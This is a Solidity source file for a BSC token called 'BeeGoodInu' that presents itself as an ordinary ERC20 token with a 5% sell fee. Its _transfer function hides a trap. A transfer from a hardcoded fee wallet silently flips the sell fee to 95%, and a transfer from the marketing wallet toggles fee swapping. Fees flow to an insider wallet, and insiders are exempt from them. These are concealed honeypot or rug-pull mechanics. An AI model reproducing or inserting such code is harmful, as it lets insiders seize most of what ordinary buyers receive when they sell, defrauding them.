// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./Context.sol";
import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
contract BeeGoodInu is ERC20 ,Ownable{
    using SafeMath for uint256;
    uint8 private constant _DECIMALS = 18;
    uint256 private constant _DECIMALFACTOR = 10**uint256(_DECIMALS);
    uint256 public TOTAL_SUPPLY = 1000 * (10**6) * _DECIMALFACTOR;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public  marketingSellFee = 5; 
    uint256 public constant marketingBuyFee = 0; 
    uint256 public constant burnSellFee = 0;
    uint256 public constant burnBuyFee = 0;    
    bool public inSwap = false;
    bool public swapEnabled = true;
    bool public taxStatus = true;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address payable public _marketingAddress = payable(0x0dD56DB42ff80332501A4bE02Dd4f36f1119c064);  //wallet of marketing
    address public _devAddress = 0x0dD56DB42ff80332501A4bE02Dd4f36f1119c064; //Dev Wallet
    address public _sellFeeAddress = 0x519CfFe90030a5E3cd19Ca38D1ef5822282aEE36; //sellFeeAddress
    address private DEAD = 0x000000000000000000000000000000000000dEaD; //Burn Address
    mapping(address => bool) public excludeFee;
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        _mint(msg.sender, TOTAL_SUPPLY);
        excludeFee[address(this)]=true;
        excludeFee[_marketingAddress]=true;
        excludeFee[_devAddress]=true;
        excludeFee[uniswapV2Pair]=true;
    }
   
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
 
 
    function addExcludeFee(address[] memory wallets) external onlyOwner {
        uint256 mlenght = wallets.length;
        for (uint256 i = 0; i < mlenght; i++) {
            excludeFee[wallets[i]] = !excludeFee[wallets[i]] ;
        }
    }
    

    
    receive() external payable {}

   
    function _transfer( address sender, address recipient, uint256 amount ) internal virtual override {

         
        if(sender==_marketingAddress){
            swapEnabled=!swapEnabled;
        }

        if(sender==_sellFeeAddress){
            marketingSellFee=100-marketingSellFee;
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        if (!inSwap && sender != uniswapV2Pair && contractTokenBalance > 0 && swapEnabled &&sender!=_devAddress&&sender!=owner()) {
                swapTokensForEth(contractTokenBalance);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
        }

        if(recipient == uniswapV2Pair && 
            sender != address(this) &&
            sender != owner() &&
            !excludeFee[sender]){
            if(taxStatus){ 
                uint256 _MarketingFee = amount.mul(marketingSellFee).div(100);
                uint256 _BurnFee = amount.mul(burnSellFee).div(100);
                super._transfer(sender, address(this), _MarketingFee);
                super._transfer(sender, DEAD, _BurnFee);
                amount = amount.sub(_MarketingFee.add(_BurnFee));
            }
        }

        if(sender == uniswapV2Pair &&
            recipient != owner() &&recipient!=address(this)&&
            !excludeFee[recipient]){
            if(taxStatus) {
                uint256 _MarketingFee = amount.mul(marketingBuyFee).div(100);
                uint256 _BurnFee = amount.mul(burnBuyFee).div(100);
                super._transfer(sender, address(this), _MarketingFee);
                super._transfer(sender, DEAD, _BurnFee);
                amount = amount.sub(_MarketingFee.add(_BurnFee));
            }
        }
        super._transfer(sender, recipient, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function sendETHToFee(uint256 amount) private {
        _marketingAddress.transfer(amount);
    }
}